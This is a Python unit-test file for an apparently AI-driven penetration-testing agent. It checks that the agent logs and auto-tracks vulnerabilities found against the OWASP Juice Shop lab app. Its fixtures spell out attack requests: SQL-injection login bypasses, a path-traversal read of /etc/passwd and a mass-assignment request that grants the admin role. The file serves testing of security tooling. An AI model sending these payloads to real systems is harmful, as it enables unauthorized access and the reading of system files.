import tempfile
import unittest
from pathlib import Path


def _import_dynamic_agent():
    import sys
    here = Path(__file__).resolve()
    repo = here.parents[2]
    oi_dir = repo / "kali-executor" / "open-interpreter"
    sys.path.insert(0, str(oi_dir))
    import dynamic_agent  # type: ignore
    return dynamic_agent


class TestAutoVulnTracking(unittest.TestCase):
    def test_save_execution_strips_curl_progress_meter_from_stderr(self):
        da = _import_dynamic_agent()
        with tempfile.TemporaryDirectory() as tmpdir:
            agent = da.DynamicAgent(log_dir=tmpdir, llm_provider=None, max_iterations=1)

            progress = (
                "% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n"
                "                                 Dload  Upload   Total   Spent    Left  Speed\n"
                "  0      0    0      0    0      0      0      0 --:--:-- --:--:-- --:--:--     0\n"
                "100    843  100    799  100     44  84096   4631 --:--:-- --:--:-- --:--:-- 88000\n"
            )

            ex = da.Execution(
                timestamp="2026-02-06T00:00:00Z",
                iteration=1,
                execution_type="command",
                content="curl http://juiceshop:3000/rest/user/login -X POST -H 'Content-Type: application/json' -d '{\"email\":\"a\",\"password\":\"b\"}'",
                stdout='{"ok":true}',
                stderr=progress,
                exit_code=0,
                duration_ms=10,
                success=True,
                tool_used="curl",
            )

            agent._save_execution(ex)
            log_path = Path(tmpdir) / "agent_executions.jsonl"
            self.assertTrue(log_path.exists())
            payload = log_path.read_text(encoding="utf-8")
            self.assertNotIn("% Total", payload)

    def test_auto_tracks_sqli_from_execution(self):
        da = _import_dynamic_agent()
        with tempfile.TemporaryDirectory() as tmpdir:
            agent = da.DynamicAgent(log_dir=tmpdir, llm_provider=None, max_iterations=1)
            agent.target = "juiceshop"

            jwt = "eyJaaaaaaaaaaa.bbbbbbbbbbb.ccccccccccc"
            ex = da.Execution(
                timestamp="2026-02-06T00:00:00Z",
                iteration=1,
                execution_type="command",
                content="curl -s -X POST http://juiceshop:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\' OR 1=1--\",\"password\":\"x\"}'",
                stdout=f'{{\"authentication\":{{\"token\":\"{jwt}\"}}}}',
                stderr="",
                exit_code=0,
                duration_ms=10,
                success=True,
                tool_used="curl",
            )

            agent._auto_track_vulns_from_execution(ex)
            self.assertIn("sql_injection_juiceshop", agent.vulns_found)

    def test_auto_tracks_sqli_strips_curl_progress_meter(self):
        da = _import_dynamic_agent()
        with tempfile.TemporaryDirectory() as tmpdir:
            agent = da.DynamicAgent(log_dir=tmpdir, llm_provider=None, max_iterations=1)
            agent.target = "juiceshop"

            jwt = "eyJaaaaaaaaaaa.bbbbbbbbbbb.ccccccccccc"
            progress = (
                "% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n"
                "                                 Dload  Upload   Total   Spent    Left  Speed\n"
                "  0      0    0      0    0      0      0      0 --:--:-- --:--:-- --:--:--     0\n"
                "100    843  100    799  100     44  84096   4631 --:--:-- --:--:-- --:--:-- 88000\n"
            )

            ex = da.Execution(
                timestamp="2026-02-06T00:00:00Z",
                iteration=1,
                execution_type="command",
                content="curl -X POST http://juiceshop:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op' OR '1'='1'--\",\"password\":\"x\"}'",
                stdout=f'{{\"authentication\":{{\"token\":\"{jwt}\"}}}}',
                stderr=progress,
                exit_code=0,
                duration_ms=10,
                success=True,
                tool_used="curl",
            )

            agent._auto_track_vulns_from_execution(ex)
            v = agent.vulns_found["sql_injection_juiceshop"]
            self.assertNotIn("% Total", v.get("details", ""))
            self.assertIn("token", v.get("details", ""))

    def test_auto_tracks_sqli_from_curl_data_file(self):
        da = _import_dynamic_agent()
        with tempfile.TemporaryDirectory() as tmpdir:
            agent = da.DynamicAgent(log_dir=tmpdir, llm_provider=None, max_iterations=1)
            agent.target = "juiceshop"

            payload_path = str(Path(tmpdir) / "payload.json")
            Path(payload_path).write_text("{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"x\"}", encoding="utf-8")

            jwt = "eyJaaaaaaaaaaa.bbbbbbbbbbb.ccccccccccc"
            ex = da.Execution(
                timestamp="2026-02-06T00:00:00Z",
                iteration=1,
                execution_type="command",
                content=f"curl -s -X POST http://juiceshop:3000/rest/user/login -H 'Content-Type: application/json' -d @{payload_path}",
                stdout=f'{{\"authentication\":{{\"token\":\"{jwt}\"}}}}',
                stderr="",
                exit_code=0,
                duration_ms=10,
                success=True,
                tool_used="curl",
            )

            agent._auto_track_vulns_from_execution(ex)
            self.assertIn("sql_injection_juiceshop", agent.vulns_found)

    def test_auto_tracks_traversal_passwd(self):
        da = _import_dynamic_agent()
        with tempfile.TemporaryDirectory() as tmpdir:
            agent = da.DynamicAgent(log_dir=tmpdir, llm_provider=None, max_iterations=1)
            agent.target = "juiceshop"

            ex = da.Execution(
                timestamp="2026-02-06T00:00:00Z",
                iteration=1,
                execution_type="command",
                content="curl -s 'http://juiceshop:3000/ftp?file=../../../../etc/passwd'",
                stdout="root:x:0:0:root:/root:/bin/bash\n",
                stderr="",
                exit_code=0,
                duration_ms=10,
                success=True,
                tool_used="curl",
            )

            agent._auto_track_vulns_from_execution(ex)
            self.assertIn("path_traversal_juiceshop", agent.vulns_found)

    def test_auto_tracks_mass_assignment_role_admin(self):
        da = _import_dynamic_agent()
        with tempfile.TemporaryDirectory() as tmpdir:
            agent = da.DynamicAgent(log_dir=tmpdir, llm_provider=None, max_iterations=1)
            agent.target = "juiceshop"

            ex = da.Execution(
                timestamp="2026-02-06T00:00:00Z",
                iteration=1,
                execution_type="command",
                content="curl -s -X POST http://juiceshop:3000/api/Users -H 'Content-Type: application/json' -d '{\"email\":\"a@b.c\",\"role\":\"admin\"}'",
                stdout="{\"email\":\"a@b.c\",\"role\":\"admin\"}",
                stderr="",
                exit_code=0,
                duration_ms=10,
                success=True,
                tool_used="curl",
            )

            agent._auto_track_vulns_from_execution(ex)
            self.assertIn("mass_assignment_juiceshop", agent.vulns_found)

    def test_auto_tracks_information_disclosure_from_ftp_bak(self):
        da = _import_dynamic_agent()
        with tempfile.TemporaryDirectory() as tmpdir:
            agent = da.DynamicAgent(log_dir=tmpdir, llm_provider=None, max_iterations=1)
            agent.target = "juiceshop"

            ex = da.Execution(
                timestamp="2026-02-06T00:00:00Z",
                iteration=1,
                execution_type="command",
                content="curl -s http://juiceshop:3000/ftp/package.json.bak",
                stdout=("{\"name\":\"juice-shop\",\"version\":\"1.0.0\",\"description\":\"" + ("x" * 120) + "\"}"),
                stderr="",
                exit_code=0,
                duration_ms=10,
                success=True,
                tool_used="curl",
            )

            agent._auto_track_vulns_from_execution(ex)
            self.assertIn("information_disclosure_juiceshop", agent.vulns_found)


if __name__ == "__main__":
    unittest.main()
